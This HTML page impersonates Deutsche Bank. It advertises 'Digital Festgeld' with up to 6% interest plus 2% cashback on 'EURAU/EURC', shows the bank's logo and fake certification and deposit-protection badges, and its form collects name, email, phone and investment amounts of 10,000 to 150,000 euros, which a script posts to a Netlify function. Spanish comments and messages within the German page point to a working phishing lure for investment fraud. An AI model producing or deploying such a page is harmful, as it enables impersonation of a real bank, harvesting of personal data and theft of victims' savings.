<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deutsche Bank - Digital Festgeld</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            color: #333;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
        }
        
        .header {
            background: linear-gradient(135deg, #00008B 0%, #0000CD 100%);
            padding: 30px 20px;
            text-align: center;
            border-bottom: 4px solid #ffd000;
        }
        
        .logo {
            width: 50px;
            height: auto;
            margin-bottom: 15px;
        }
        
        .header h1 {
            color: #ffffff;
            font-size: 28px;
            font-weight: 300;
            margin-bottom: 5px;
        }
        
        .header p {
            color: #ffd000;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .hero {
            padding: 40px 30px;
            background: linear-gradient(to bottom, #f9f9f9, #ffffff);
            text-align: center;
        }
        
        .hero h2 {
            color: #00008B;
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        .hero-subtitle {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .highlight {
            background-color: #fff3cd;
            border-left: 4px solid #ffd000;
            padding: 20px;
            margin: 25px 30px;
            border-radius: 4px;
            text-align: left;
        }
        
        .highlight-title {
            color: #00008B;
            font-weight: 600;
            font-size: 18px;
            margin-bottom: 10px;
        }
        
        .highlight-content {
            color: #555;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .form-section {
            padding: 30px;
            background-color: #f9f9f9;
        }
        
        .form-section h3 {
            color: #00008B;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 25px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #00008B;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            font-family: inherit;
            box-sizing: border-box;
        }
        
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #00008B;
            box-shadow: 0 0 0 3px rgba(0, 0, 139, 0.1);
        }
        
        .form-group input::placeholder {
            color: #999;
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .submit-btn {
            background: linear-gradient(135deg, #00008B 0%, #0000CD 100%);
            color: #ffffff;
            padding: 14px 30px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: all 0.3s ease;
        }
        
        .submit-btn:hover {
            opacity: 0.9;
        }
        
        .submit-btn:active {
            transform: scale(0.98);
        }
        
        .security-badges {
            background-color: #f9f9f9;
            padding: 20px 30px;
            text-align: center;
        }
        
        .security-badge {
            display: inline-block;
            padding: 12px 20px;
            border-radius: 4px;
            font-size: 13px;
            font-weight: 600;
            margin: 5px;
            margin-bottom: 10px;
        }
        
        .badge-1 {
            background-color: #e3f2fd;
            border: 1px solid #2196F3;
            color: #1565c0;
        }
        
        .badge-2 {
            background-color: #e8f5e9;
            border: 1px solid #4caf50;
            color: #2e7d32;
        }
        
        .badge-3 {
            background-color: #fff3e0;
            border: 1px solid #ff9800;
            color: #e65100;
        }
        
        .footer {
            background-color: #00008B;
            color: #ffffff;
            padding: 30px;
            text-align: center;
            font-size: 12px;
            line-height: 1.6;
            border-top: 4px solid #ffd000;
        }
        
        .footer p {
            margin: 8px 0;
        }
        
        .footer strong {
            font-weight: 600;
        }
        
        .alert {
            padding: 15px;
            border-radius: 4px;
            margin-top: 15px;
            font-size: 13px;
            text-align: center;
            display: none;
        }
        
        .alert.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        @media (max-width: 600px) {
            .header h1 {
                font-size: 22px;
            }
            
            .hero h2 {
                font-size: 20px;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
            
            .security-badge {
                display: block;
                margin-bottom: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Deutsche_Bank_logo_without_wordmark.svg/240px-Deutsche_Bank_logo_without_wordmark.svg.png" alt="Deutsche Bank" class="logo">
            <h1>Digital Festgeld</h1>
            <p>Ihr Geld verdient mehr</p>
        </div>
        
        <!-- Hero Section -->
        <div class="hero">
            <h2>Bis zu 6% Zinsen + 2% Cashback</h2>
            <p class="hero-subtitle">Wandeln Sie Ihr Geld in digitales, hochsicheres EURAU/EURC um und profitieren Sie von attraktiven Renditen.</p>
        </div>
        
        <!-- Highlight Box -->
        <div class="highlight">
            <div class="highlight-title">🎯 Exklusives Angebot</div>
            <div class="highlight-content">
                <strong>Aktion bis 02.03.2026:</strong><br>
                Nutzen Sie eine oder beide Aktionen und erhalten Sie Ihre maximale Rendite. Mit nur wenigen Klicks können Sie Ihr Konto eröffnen.
            </div>
        </div>
        
        <!-- Form Section -->
        <div class="form-section">
            <h3>📝 Konto Eröffnen</h3>
            
            <form id="campaignForm">
                <!-- Nombre y Apellido -->
                <div class="form-row">
                    <div class="form-group">
                        <label for="vorname">Vorname *</label>
                        <input type="text" id="vorname" name="vorname" placeholder="Ihr Vorname" required>
                    </div>
                    <div class="form-group">
                        <label for="nachname">Nachname *</label>
                        <input type="text" id="nachname" name="nachname" placeholder="Ihr Nachname" required>
                    </div>
                </div>
                
                <!-- Email -->
                <div class="form-group">
                    <label for="email">Email *</label>
                    <input type="email" id="email" name="email" placeholder="ihre.email@example.com" required>
                </div>
                
                <!-- Teléfono -->
                <div class="form-group">
                    <label for="telefon">Telefon *</label>
                    <input type="tel" id="telefon" name="telefon" placeholder="+49..." required>
                </div>
                
                <!-- Monto y Moneda -->
                <div class="form-row">
                    <div class="form-group">
                        <label for="anlagebetrag">Anlagebetrag (€) *</label>
                        <input type="number" id="anlagebetrag" name="anlagebetrag" placeholder="10.000 - 150.000" min="10000" max="150000" required>
                    </div>
                    <div class="form-group">
                        <label for="waehrung">Währung</label>
                        <select id="waehrung" name="waehrung">
                            <option value="EURC">EURC</option>
                            <option value="EURAU">EURAU</option>
                        </select>
                    </div>
                </div>
                
                <!-- Alert Message -->
                <div id="alertMessage" class="alert"></div>
                
                <!-- Submit Button -->
                <button type="submit" class="submit-btn">🚀 Jetzt Konto Eröffnen</button>
            </form>
        </div>
        
        <!-- Security Badges -->
        <div class="security-badges">
            <div class="security-badge badge-1">✓ Deutsche Bank Zertifiziert</div>
            <div class="security-badge badge-2">✓ 100% Einlagensicherung</div>
            <div class="security-badge badge-3">✓ 24/7 Support</div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <p><strong>Deutsche Bank AG</strong></p>
            <p>Wir sind für Sie da - 24/7 verfügbar</p>
            <p style="margin-top: 15px;">Telefon: +49 (0) 116 116 | Web | Kontakt</p>
            <p style="margin-top: 15px; color: #aaa; font-size: 11px;">Wichtiger Hinweis: Diese E-Mail enthält wichtige Informationen zu Ihrem Angebot.</p>
            <p style="margin-top: 10px; color: #999; font-size: 11px;">© 2026 Deutsche Bank AG. Alle Rechte vorbehalten.</p>
        </div>
    </div>

    <script>
        document.getElementById('campaignForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const alertDiv = document.getElementById('alertMessage');
            
            try {
                // Validar que todos los campos están llenos
                const vorname = document.getElementById('vorname').value.trim();
                const nachname = document.getElementById('nachname').value.trim();
                const email = document.getElementById('email').value.trim();
                const telefon = document.getElementById('telefon').value.trim();
                const anlagebetrag = document.getElementById('anlagebetrag').value;
                const waehrung = document.getElementById('waehrung').value;

                if (!vorname || !nachname || !email || !telefon || !anlagebetrag) {
                    throw new Error('Por favor complete todos los campos');
                }

                // Enviar datos a la API
                const response = await fetch('/.netlify/functions/submitEmailCampaign', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        vorname,
                        nachname,
                        email,
                        telefon,
                        anlagebetrag: parseFloat(anlagebetrag),
                        waehrung
                    })
                });

                const data = await response.json();

                if (response.ok) {
                    alertDiv.className = 'alert success';
                    alertDiv.textContent = '✓ Solicitud enviada exitosamente. Un asesor se contactará con usted pronto.';
                    alertDiv.style.display = 'block';
                    document.getElementById('campaignForm').reset();
                } else {
                    throw new Error(data.message || 'Error al enviar el formulario');
                }
            } catch (error) {
                alertDiv.className = 'alert error';
                alertDiv.textContent = '✗ Error: ' + error.message;
                alertDiv.style.display = 'block';
            }
        });
    </script>
</body>
</html>